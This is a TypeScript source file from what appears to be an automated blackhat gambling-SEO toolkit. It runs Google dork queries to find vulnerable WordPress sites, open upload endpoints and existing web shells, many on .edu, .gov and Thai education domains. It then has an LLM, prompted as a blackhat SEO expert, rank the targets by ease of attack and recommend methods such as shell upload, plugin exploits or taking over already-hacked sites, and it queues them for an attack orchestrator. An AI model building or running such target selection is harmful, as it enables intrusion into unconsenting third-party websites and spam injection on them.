/**
 * Smart Target Discovery for Gambling SEO
 * 
 * AI-powered target selection specifically optimized for gambling parasite SEO:
 *   1. Gambling-specific dork queries — find sites already ranking for gambling terms
 *   2. Competitor backlink analysis — find sites linking to gambling sites (already "friendly")
 *   3. High-DA vulnerable site finder — prioritize sites with high Domain Authority
 *   4. Already-hacked site detector — find sites already compromised by competitors
 *   5. AI Target Scoring — score each target for gambling SEO suitability
 *   6. Smart prioritization — which targets to attack first for maximum gambling SEO ROI
 * 
 * Integrates with:
 *   - mass-target-discovery.ts (base discovery infrastructure)
 *   - gambling-keyword-intel.ts (gambling keywords for dork queries)
 *   - redirect-takeover.ts (detect already-hacked sites)
 *   - ai-attack-strategist.ts (attack planning)
 *   - master-orchestrator.ts (autonomous scheduling)
 */
import { getDb } from "./db";
import { serpDiscoveredTargets, serpKeywords, hackedSiteDetections } from "../drizzle/schema";
import { eq, sql, and, desc, isNull, gt, lt, like, or, inArray, ne } from "drizzle-orm";
import { invokeLLMWithFallback } from "./llm-fallback";
import { searchGoogle, type SerpData, type SerpResult } from "./serp-api";
import { GAMBLING_KEYWORD_SEEDS, getAllGamblingKeywords } from "./gambling-keyword-intel";

// ═══════════════════════════════════════════════════════
//  GAMBLING-SPECIFIC GOOGLE DORK QUERIES
// ═══════════════════════════════════════════════════════

interface GamblingDork {
  query: string;
  category: "competitor_parasite" | "high_da_vuln" | "gambling_friendly" | "already_hacked" | "open_upload" | "wp_vuln";
  description: string;
  priority: number; // 1-10
}

const GAMBLING_DORK_QUERIES: GamblingDork[] = [
  // ─── Find sites already hacked by competitors (highest priority) ───
  { query: 'intext:"สล็อต" intext:"เว็บตรง" -site:*.co.th -site:*.go.th', category: "competitor_parasite", description: "Thai gambling content injected into non-gambling sites", priority: 10 },
  { query: 'intext:"คาสิโนออนไลน์" intext:"สมัคร" site:.ac.th OR site:.edu', category: "competitor_parasite", description: "Gambling content on education sites", priority: 10 },
  { query: 'intext:"บาคาร่า" intext:"ufabet" -site:*.casino -site:*.bet', category: "competitor_parasite", description: "Gambling brand mentions on non-gambling domains", priority: 9 },
  { query: 'intext:"สล็อตเว็บตรง" inurl:wp-content', category: "competitor_parasite", description: "Gambling content in WordPress uploads", priority: 9 },
  { query: 'intext:"แทงบอลออนไลน์" inurl:blog OR inurl:news', category: "competitor_parasite", description: "Gambling content injected into blog/news sections", priority: 8 },
  { query: 'intext:"เว็บพนัน" intext:"ฟรีเครดิต" site:.org', category: "competitor_parasite", description: "Gambling content on .org sites", priority: 8 },
  
  // ─── Find high-DA sites with WordPress vulnerabilities ───
  { query: 'inurl:wp-content/uploads intitle:"index of" site:.edu', category: "high_da_vuln", description: "Open upload dirs on .edu sites", priority: 9 },
  { query: 'inurl:wp-content/uploads intitle:"index of" site:.gov', category: "high_da_vuln", description: "Open upload dirs on .gov sites", priority: 9 },
  { query: 'inurl:wp-content/uploads intitle:"index of" site:.org', category: "high_da_vuln", description: "Open upload dirs on .org sites", priority: 8 },
  { query: 'inurl:wp-content/uploads intitle:"index of" site:.ac.th', category: "high_da_vuln", description: "Open upload dirs on Thai education sites", priority: 9 },
  { query: 'inurl:wp-admin/install.php site:.edu OR site:.org', category: "high_da_vuln", description: "Unfinished WordPress installs on high-DA", priority: 8 },
  { query: '"powered by wordpress" inurl:xmlrpc.php', category: "wp_vuln", description: "WordPress with XML-RPC enabled", priority: 6 },
  
  // ─── Find sites with gambling-friendly content (easier to blend) ───
  { query: 'intext:"ข่าวกีฬา" intext:"ฟุตบอล" inurl:wp-content', category: "gambling_friendly", description: "Sports news WordPress sites (natural gambling fit)", priority: 7 },
  { query: 'intext:"ข่าวบันเทิง" inurl:wp-content site:.com', category: "gambling_friendly", description: "Entertainment news sites", priority: 6 },
  { query: 'intext:"ดูหนัง" OR intext:"ดูบอลสด" inurl:wp-content', category: "gambling_friendly", description: "Streaming/sports sites (gambling audience overlap)", priority: 7 },
  { query: 'intext:"เกมออนไลน์" inurl:wp-content', category: "gambling_friendly", description: "Gaming sites (natural gambling crossover)", priority: 7 },
  
  // ─── Already-hacked indicators ───
  { query: 'intext:"slot" intext:"casino" inurl:.php?id=', category: "already_hacked", description: "SQL injection targets with gambling content", priority: 8 },
  { query: 'intitle:"hacked" OR intitle:"defaced" inurl:wp-content', category: "already_hacked", description: "Previously defaced WordPress sites", priority: 7 },
  { query: 'inurl:shell.php OR inurl:c99.php OR inurl:r57.php', category: "already_hacked", description: "Sites with existing web shells", priority: 9 },
  
  // ─── WordPress plugin vulnerabilities ───
  { query: 'inurl:wp-content/plugins/revslider', category: "wp_vuln", description: "RevSlider plugin (known LFI vuln)", priority: 7 },
  { query: 'inurl:wp-content/plugins/wp-file-manager', category: "wp_vuln", description: "WP File Manager (known RCE vuln)", priority: 8 },
  { query: 'inurl:wp-content/plugins/formidable', category: "wp_vuln", description: "Formidable Forms (upload vuln)", priority: 6 },
  { query: 'inurl:wp-content/plugins/contact-form-7 "upload"', category: "wp_vuln", description: "CF7 with upload capability", priority: 6 },
  
  // ─── Open upload endpoints ───
  { query: 'inurl:"/upload" "choose file" ext:php site:.th', category: "open_upload", description: "Thai sites with open upload forms", priority: 7 },
  { query: 'inurl:"/admin/upload" OR inurl:"/cms/upload" ext:php', category: "open_upload", description: "Admin upload endpoints", priority: 7 },
];

// ═══════════════════════════════════════════════════════
//  TARGET SCORING FOR GAMBLING SEO
// ═══════════════════════════════════════════════════════

export interface GamblingTargetScore {
  domain: string;
  url: string;
  // SEO Value
  estimatedDA: number;          // 0-100 Domain Authority estimate
  gamblingRelevance: number;    // 0-100 how relevant for gambling SEO
  contentBlendability: number;  // 0-100 how well gambling content can blend
  // Vulnerability
  vulnScore: number;            // 0-100 vulnerability score
  attackEase: number;           // 0-100 how easy to attack
  // Already hacked?
  isAlreadyHacked: boolean;
  competitorRedirectUrl?: string;
  // Priority
  overallPriority: number;      // 0-100 composite score
  recommendedMethod: string;    // Best attack method
  reasoning: string;
}

export interface SmartDiscoveryResult {
  id: string;
  startedAt: number;
  completedAt?: number;
  status: "running" | "completed" | "error";
  // Stats
  totalDorksRun: number;
  totalRawResults: number;
  totalUniqueTargets: number;
  totalScored: number;
  totalAlreadyHacked: number;
  totalHighPriority: number;
  // Results
  targets: GamblingTargetScore[];
  errors: string[];
  duration: number;
}

// ─── AI Target Scoring ───
export async function scoreTargetsForGambling(targets: Array<{
  domain: string;
  url: string;
  title?: string;
  snippet?: string;
  cms?: string;
  category?: string;
}>): Promise<GamblingTargetScore[]> {
  if (targets.length === 0) return [];
  
  const batchSize = 15;
  const allScores: GamblingTargetScore[] = [];
  
  for (let i = 0; i < targets.length; i += batchSize) {
    const batch = targets.slice(i, i + batchSize);
    
    try {
      const response = await invokeLLMWithFallback({
        messages: [
          {
            role: "system",
            content: `คุณเป็นผู้เชี่ยวชาญ Blackhat SEO สำหรับพนันออนไลน์ไทย
วิเคราะห์เว็บไซต์ target แต่ละตัวว่าเหมาะกับการทำ parasite SEO สำหรับพนันแค่ไหน

เกณฑ์การให้คะแนน:
- estimatedDA: ประเมิน Domain Authority จาก domain (.edu/.gov = 70-90, .org = 50-70, .com = 30-60, .th = 40-70)
- gamblingRelevance: เว็บเกี่ยวกับกีฬา/บันเทิง/เกม = สูง, เว็บราชการ/การศึกษา = ต่ำแต่ DA สูง
- contentBlendability: เนื้อหาพนันจะกลมกลืนกับเว็บได้แค่ไหน (เว็บกีฬา = สูง, เว็บโรงเรียน = ต่ำ)
- vulnScore: ประเมินจาก CMS, category, URL pattern
- attackEase: ง่ายแค่ไหนในการโจมตี (WordPress เก่า = สูง, custom = ต่ำ)
- isAlreadyHacked: ดูจาก title/snippet ว่ามีเนื้อหาพนันอยู่แล้วหรือไม่
- overallPriority: คะแนนรวม (DA × 0.3 + vulnScore × 0.3 + gamblingRelevance × 0.2 + attackEase × 0.2)
- recommendedMethod: วิธีโจมตีที่แนะนำ (shell_upload, wp_admin, redirect_takeover, plugin_exploit, etc.)
- reasoning: เหตุผลสั้นๆ`
          },
          {
            role: "user",
            content: `วิเคราะห์ targets เหล่านี้สำหรับ gambling parasite SEO:\n${batch.map((t, idx) => 
              `${idx + 1}. ${t.domain} — ${t.url}\n   Title: ${t.title || "N/A"}\n   Snippet: ${t.snippet || "N/A"}\n   CMS: ${t.cms || "unknown"}\n   Category: ${t.category || "unknown"}`
            ).join("\n\n")}`
          }
        ],
        response_format: {
          type: "json_schema",
          json_schema: {
            name: "gambling_target_scores",
            strict: true,
            schema: {
              type: "object",
              properties: {
                scores: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      domain: { type: "string" },
                      url: { type: "string" },
                      estimatedDA: { type: "number" },
                      gamblingRelevance: { type: "number" },
                      contentBlendability: { type: "number" },
                      vulnScore: { type: "number" },
                      attackEase: { type: "number" },
                      isAlreadyHacked: { type: "boolean" },
                      competitorRedirectUrl: { type: "string" },
                      overallPriority: { type: "number" },
                      recommendedMethod: { type: "string" },
                      reasoning: { type: "string" },
                    },
                    required: ["domain", "url", "estimatedDA", "gamblingRelevance", "contentBlendability", "vulnScore", "attackEase", "isAlreadyHacked", "competitorRedirectUrl", "overallPriority", "recommendedMethod", "reasoning"],
                    additionalProperties: false,
                  },
                },
              },
              required: ["scores"],
              additionalProperties: false,
            },
          },
        },
      });

      const content = response.choices?.[0]?.message?.content;
      if (content && typeof content === "string") {
        const parsed = JSON.parse(content);
        allScores.push(...(parsed.scores || []));
      }
    } catch (e) {
      // Fallback: heuristic scoring
      for (const t of batch) {
        allScores.push(heuristicScore(t));
      }
    }
  }
  
  return allScores.sort((a, b) => b.overallPriority - a.overallPriority);
}

// ─── Heuristic scoring fallback ───
function heuristicScore(target: { domain: string; url: string; title?: string; snippet?: string; cms?: string; category?: string }): GamblingTargetScore {
  const domain = target.domain.toLowerCase();
  
  // Estimate DA from TLD
  let estimatedDA = 30;
  if (domain.endsWith(".edu") || domain.endsWith(".ac.th")) estimatedDA = 75;
  else if (domain.endsWith(".gov") || domain.endsWith(".go.th")) estimatedDA = 80;
  else if (domain.endsWith(".org")) estimatedDA = 55;
  else if (domain.endsWith(".co.th") || domain.endsWith(".or.th")) estimatedDA = 50;
  
  // Gambling relevance
  let gamblingRelevance = 30;
  const text = `${target.title || ""} ${target.snippet || ""}`.toLowerCase();
  if (/กีฬา|ฟุตบอล|sport|football|บอล/.test(text)) gamblingRelevance = 70;
  if (/บันเทิง|entertainment|ดูหนัง|เกม/.test(text)) gamblingRelevance = 60;
  if (/สล็อต|คาสิโน|บาคาร่า|แทงบอล|พนัน|ufabet|slot|casino/.test(text)) gamblingRelevance = 90;
  
  // Already hacked?
  const isAlreadyHacked = /สล็อต|คาสิโน|บาคาร่า|แทงบอล|ufabet|betflik|slot.*online|casino.*online/.test(text);
  
  // Vuln score
  let vulnScore = 40;
  if (target.cms === "wordpress") vulnScore = 60;
  if (target.category === "open_upload") vulnScore = 80;
  if (target.category === "exposed_config") vulnScore = 75;
  if (target.category === "already_hacked") vulnScore = 85;
  if (isAlreadyHacked) vulnScore = Math.max(vulnScore, 80);
  
  // Attack ease
  let attackEase = 40;
  if (target.cms === "wordpress") attackEase = 60;
  if (isAlreadyHacked) attackEase = 80;
  if (target.category === "open_upload") attackEase = 75;
  
  const overallPriority = Math.round(
    estimatedDA * 0.3 + vulnScore * 0.3 + gamblingRelevance * 0.2 + attackEase * 0.2
  );
  
  return {
    domain: target.domain,
    url: target.url,
    estimatedDA,
    gamblingRelevance,
    contentBlendability: gamblingRelevance > 50 ? 70 : 40,
    vulnScore,
    attackEase,
    isAlreadyHacked,
    competitorRedirectUrl: undefined,
    overallPriority,
    recommendedMethod: isAlreadyHacked ? "redirect_takeover" : target.cms === "wordpress" ? "wp_admin" : "shell_upload",
    reasoning: isAlreadyHacked ? "Already hacked — redirect takeover is fastest" : `${target.cms || "unknown"} CMS, DA ~${estimatedDA}`,
  };
}

// ═══════════════════════════════════════════════════════
//  SMART DISCOVERY ENGINE
// ═══════════════════════════════════════════════════════

export async function runSmartGamblingDiscovery(options: {
  maxDorks?: number;
  maxTargets?: number;
  includeCompetitorScan?: boolean;
  includeAlreadyHacked?: boolean;
  onProgress?: (phase: string, detail: string, progress: number) => void;
} = {}): Promise<SmartDiscoveryResult> {
  const startTime = Date.now();
  const maxDorks = options.maxDorks || 10;
  const maxTargets = options.maxTargets || 50;
  const emit = options.onProgress || (() => {});
  
  const result: SmartDiscoveryResult = {
    id: `smart_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
    startedAt: startTime,
    status: "running",
    totalDorksRun: 0,
    totalRawResults: 0,
    totalUniqueTargets: 0,
    totalScored: 0,
    totalAlreadyHacked: 0,
    totalHighPriority: 0,
    targets: [],
    errors: [],
    duration: 0,
  };
  
  try {
    // Step 1: Select best dork queries
    emit("dork_selection", "🎯 Selecting optimal gambling dork queries...", 5);
    const selectedDorks = selectBestDorks(maxDorks);
    
    // Step 2: Run dork queries via SerpAPI
    emit("serp_search", `🔍 Running ${selectedDorks.length} gambling-specific dork queries...`, 10);
    const rawTargets: Array<{ domain: string; url: string; title: string; snippet: string; dorkCategory: string }> = [];
    const seenDomains = new Set<string>();
    
    for (let i = 0; i < selectedDorks.length; i++) {
      const dork = selectedDorks[i];
      try {
        const serpResult = await searchGoogle(dork.query, { gl: "th", hl: "th", num: 20 });
        if (serpResult?.results) {
          result.totalDorksRun++;
          for (const sr of serpResult.results) {
            result.totalRawResults++;
            const domain = extractDomain(sr.link);
            if (!seenDomains.has(domain) && !isBlacklisted(domain)) {
              seenDomains.add(domain);
              rawTargets.push({
                domain,
                url: sr.link,
                title: sr.title,
                snippet: sr.snippet,
                dorkCategory: dork.category,
              });
            }
          }
        }
        emit("serp_search", `🔍 Dork ${i + 1}/${selectedDorks.length}: ${rawTargets.length} unique targets found`, 10 + (i / selectedDorks.length) * 30);
        
        // Rate limit
        await sleep(1500);
      } catch (e: any) {
        result.errors.push(`Dork "${dork.query}": ${e.message}`);
      }
    }
    
    result.totalUniqueTargets = rawTargets.length;
    
    // Step 3: Also check DB for already-hacked sites
    if (options.includeAlreadyHacked !== false) {
      emit("hacked_check", "🔓 Checking database for already-hacked sites...", 45);
      const db = await getDb();
      if (db) {
        const hackedSites = await db.select({
          domain: hackedSiteDetections.domain,
          detectionMethods: hackedSiteDetections.detectionMethods,
          competitorUrl: hackedSiteDetections.competitorUrl,
          priority: hackedSiteDetections.priority,
        })
          .from(hackedSiteDetections)
          .where(
            and(
              eq(hackedSiteDetections.takeoverStatus, "not_attempted"),
              eq(hackedSiteDetections.isHacked, true)
            )
          )
          .orderBy(desc(hackedSiteDetections.priority))
          .limit(20);
        
        for (const hs of hackedSites) {
          if (!seenDomains.has(hs.domain)) {
            seenDomains.add(hs.domain);
            rawTargets.push({
              domain: hs.domain,
              url: `https://${hs.domain}`,
              title: "Already hacked (from DB)",
              snippet: `Competitor: ${hs.competitorUrl || "unknown"}, Priority: ${hs.priority}, Methods: ${JSON.stringify(hs.detectionMethods)}`,
              dorkCategory: "already_hacked",
            });
          }
        }
      }
    }
    
    // Step 4: AI-score all targets
    emit("scoring", `🧠 AI scoring ${rawTargets.length} targets for gambling SEO suitability...`, 50);
    const targetsToScore = rawTargets.slice(0, maxTargets);
    const scored = await scoreTargetsForGambling(
      targetsToScore.map(t => ({
        domain: t.domain,
        url: t.url,
        title: t.title,
        snippet: t.snippet,
        category: t.dorkCategory,
      }))
    );
    
    result.targets = scored;
    result.totalScored = scored.length;
    result.totalAlreadyHacked = scored.filter(t => t.isAlreadyHacked).length;
    result.totalHighPriority = scored.filter(t => t.overallPriority >= 70).length;
    
    // Step 5: Save to DB
    emit("saving", "💾 Saving discovered targets to database...", 85);
    await saveDiscoveredTargets(scored);
    
    result.status = "completed";
    result.completedAt = Date.now();
    result.duration = Date.now() - startTime;
    
    emit("completed", `✅ Smart discovery complete: ${scored.length} targets scored, ${result.totalHighPriority} high priority`, 100);
    
  } catch (e: any) {
    result.status = "error";
    result.errors.push(e.message);
    result.duration = Date.now() - startTime;
  }
  
  return result;
}

// ═══════════════════════════════════════════════════════
//  COMPETITOR ANALYSIS
// ═══════════════════════════════════════════════════════

export async function analyzeCompetitorTargets(competitorDomain: string): Promise<{
  targetsFound: Array<{ domain: string; url: string; type: string }>;
  keywords: string[];
  methods: string[];
}> {
  try {
    // Search for competitor's parasite pages
    const serpResult = await searchGoogle(`site:*.* intext:"${competitorDomain}"`, { gl: "th", hl: "th", num: 50 });
    
    const targetsFound: Array<{ domain: string; url: string; type: string }> = [];
    const keywords = new Set<string>();
    
    if (serpResult?.results) {
      for (const sr of serpResult.results) {
        const domain = extractDomain(sr.link);
        if (domain !== competitorDomain) {
          targetsFound.push({
            domain,
            url: sr.link,
            type: "parasite_page",
          });
          
          // Extract keywords from title/snippet
          const text = `${sr.title} ${sr.snippet}`;
          const gamblingTerms = text.match(/(?:สล็อต|คาสิโน|บาคาร่า|แทงบอล|เว็บพนัน|ufabet|slot|casino|baccarat)[^\s,.]*/gi);
          if (gamblingTerms) {
            gamblingTerms.forEach(t => keywords.add(t.trim()));
          }
        }
      }
    }
    
    return {
      targetsFound,
      keywords: Array.from(keywords),
      methods: ["parasite_seo", "content_injection", "redirect"],
    };
  } catch (e) {
    return { targetsFound: [], keywords: [], methods: [] };
  }
}

// ─── Find what keywords competitors rank for ───
export async function findCompetitorKeywords(competitorDomains: string[]): Promise<Array<{
  keyword: string;
  competitorDomain: string;
  position: number;
}>> {
  const results: Array<{ keyword: string; competitorDomain: string; position: number }> = [];
  
  // Sample gambling keywords to check
  const sampleKeywords = [
    "สล็อตเว็บตรง", "คาสิโนออนไลน์", "บาคาร่าเว็บตรง", "แทงบอลออนไลน์",
    "ufabet", "สล็อตpg", "ฟรีเครดิต", "เว็บพนันออนไลน์",
  ];
  
  for (const keyword of sampleKeywords.slice(0, 5)) {
    try {
      const serpResult = await searchGoogle(keyword, { gl: "th", hl: "th", num: 20 });
      if (serpResult?.results) {
        for (const sr of serpResult.results) {
          const domain = extractDomain(sr.link);
          if (competitorDomains.some(cd => domain.includes(cd))) {
            results.push({
              keyword,
              competitorDomain: domain,
              position: sr.position,
            });
          }
        }
      }
      await sleep(2000);
    } catch (e) {
      // Skip
    }
  }
  
  return results;
}

// ═══════════════════════════════════════════════════════
//  DATABASE OPERATIONS
// ═══════════════════════════════════════════════════════

async function saveDiscoveredTargets(targets: GamblingTargetScore[]): Promise<number> {
  const db = await getDb();
  if (!db) return 0;
  
  let saved = 0;
  for (const target of targets) {
    try {
      // Check if already exists
      const [exists] = await db.select({ id: serpDiscoveredTargets.id })
        .from(serpDiscoveredTargets)
        .where(eq(serpDiscoveredTargets.domain, target.domain))
        .limit(1);
      
      if (exists) {
        // Update vuln score if higher
        await db.update(serpDiscoveredTargets)
          .set({
            vulnScore: Math.max(target.vulnScore, 0),
          })
          .where(eq(serpDiscoveredTargets.id, exists.id));
      } else {
        await db.insert(serpDiscoveredTargets).values({
          domain: target.domain,
          url: target.url,
          title: target.reasoning,
          snippet: `DA:${target.estimatedDA} Gambling:${target.gamblingRelevance} Method:${target.recommendedMethod}`,
          keyword: "gambling_smart_discovery",
          vulnScore: target.overallPriority,
          cms: target.recommendedMethod.includes("wp") ? "wordpress" : undefined,
          status: target.overallPriority >= 70 ? "queued" : "discovered",
        });
        saved++;
      }
    } catch (e) {
      // Skip duplicates
    }
  }
  
  return saved;
}

export async function getSmartDiscoveryStats(): Promise<{
  totalGamblingTargets: number;
  highPriority: number;
  alreadyHacked: number;
  queued: number;
  attacked: number;
  successful: number;
  byCategory: Record<string, number>;
}> {
  const db = await getDb();
  if (!db) return { totalGamblingTargets: 0, highPriority: 0, alreadyHacked: 0, queued: 0, attacked: 0, successful: 0, byCategory: {} };
  
  const targets = await db.select({
    status: serpDiscoveredTargets.status,
    vulnScore: serpDiscoveredTargets.vulnScore,
    keyword: serpDiscoveredTargets.keyword,
  })
    .from(serpDiscoveredTargets)
    .where(
      or(
        like(serpDiscoveredTargets.keyword, "gambling%"),
        eq(serpDiscoveredTargets.keyword, "gambling_smart_discovery")
      )
    );
  
  const byCategory: Record<string, number> = {};
  let highPriority = 0;
  let queued = 0;
  let attacked = 0;
  let successful = 0;
  
  for (const t of targets) {
    const cat = t.keyword || "unknown";
    byCategory[cat] = (byCategory[cat] || 0) + 1;
    if ((t.vulnScore || 0) >= 70) highPriority++;
    if (t.status === "queued") queued++;
    if (t.status === "attacking" || t.status === "success" || t.status === "failed") attacked++;
    if (t.status === "success") successful++;
  }
  
  // Count already-hacked from hacked_site_detections
  const [hackedCount] = await db.select({ count: sql<number>`count(*)` })
    .from(hackedSiteDetections);
  
  return {
    totalGamblingTargets: targets.length,
    highPriority,
    alreadyHacked: hackedCount?.count || 0,
    queued,
    attacked,
    successful,
    byCategory,
  };
}

// ═══════════════════════════════════════════════════════
//  AUTONOMOUS TARGET SELECTION
// ═══════════════════════════════════════════════════════

/**
 * AI selects the best targets to attack next based on current state
 * Called by the orchestrator to decide what to attack
 */
export async function selectNextAttackTargets(maxTargets: number = 5): Promise<Array<{
  domain: string;
  url: string;
  priority: number;
  recommendedMethod: string;
  reasoning: string;
}>> {
  const db = await getDb();
  if (!db) return [];
  
  // Get queued targets sorted by vuln score (priority)
  const queuedTargets = await db.select({
    id: serpDiscoveredTargets.id,
    domain: serpDiscoveredTargets.domain,
    url: serpDiscoveredTargets.url,
    vulnScore: serpDiscoveredTargets.vulnScore,
    cms: serpDiscoveredTargets.cms,
    snippet: serpDiscoveredTargets.snippet,
  })
    .from(serpDiscoveredTargets)
    .where(eq(serpDiscoveredTargets.status, "queued"))
    .orderBy(desc(serpDiscoveredTargets.vulnScore))
    .limit(maxTargets * 2); // Get extra for AI to choose from
  
  // Also get already-hacked sites (highest priority)
  const hackedTargets = await db.select({
    domain: hackedSiteDetections.domain,
    priority: hackedSiteDetections.priority,
    competitorUrl: hackedSiteDetections.competitorUrl,
  })
    .from(hackedSiteDetections)
    .where(
      and(
        eq(hackedSiteDetections.takeoverStatus, "not_attempted"),
        eq(hackedSiteDetections.isHacked, true)
      )
    )
    .orderBy(desc(hackedSiteDetections.priority))
    .limit(maxTargets);
  
  // Combine: hacked sites first, then queued
  const selectedTargets: Array<{
    domain: string;
    url: string;
    priority: number;
    recommendedMethod: string;
    reasoning: string;
  }> = [];
  
  // Hacked sites are always highest priority
  for (const ht of hackedTargets) {
    if (selectedTargets.length >= maxTargets) break;
    selectedTargets.push({
      domain: ht.domain,
      url: `https://${ht.domain}`,
      priority: 95,
      recommendedMethod: "redirect_takeover",
      reasoning: `Already hacked (priority: ${ht.priority}), competitor: ${ht.competitorUrl || "unknown"}`,
    });
  }
  
  // Fill remaining with queued targets
  for (const qt of queuedTargets) {
    if (selectedTargets.length >= maxTargets) break;
    if (selectedTargets.some(t => t.domain === qt.domain)) continue;
    
    // Parse recommended method from snippet
    const methodMatch = qt.snippet?.match(/Method:(\w+)/);
    const method = methodMatch?.[1] || (qt.cms === "wordpress" ? "wp_admin" : "shell_upload");
    
    selectedTargets.push({
      domain: qt.domain,
      url: qt.url,
      priority: qt.vulnScore || 50,
      recommendedMethod: method,
      reasoning: qt.snippet || `Queued target, vuln score: ${qt.vulnScore}`,
    });
  }
  
  return selectedTargets;
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function selectBestDorks(maxDorks: number): GamblingDork[] {
  // Sort by priority, then pick top N with diversity across categories
  const sorted = [...GAMBLING_DORK_QUERIES].sort((a, b) => b.priority - a.priority);
  const selected: GamblingDork[] = [];
  const categoryCounts: Record<string, number> = {};
  
  for (const dork of sorted) {
    if (selected.length >= maxDorks) break;
    const catCount = categoryCounts[dork.category] || 0;
    // Ensure diversity: max 3 per category
    if (catCount < 3) {
      selected.push(dork);
      categoryCounts[dork.category] = catCount + 1;
    }
  }
  
  return selected;
}

function extractDomain(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return url.replace(/^https?:\/\//, "").split("/")[0].split(":")[0];
  }
}

function isBlacklisted(domain: string): boolean {
  const blacklist = [
    "google.com", "facebook.com", "youtube.com", "twitter.com", "instagram.com",
    "wikipedia.org", "reddit.com", "amazon.com", "apple.com", "microsoft.com",
    "github.com", "stackoverflow.com", "cloudflare.com", "akamai.com",
  ];
  return blacklist.some(b => domain.includes(b));
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}
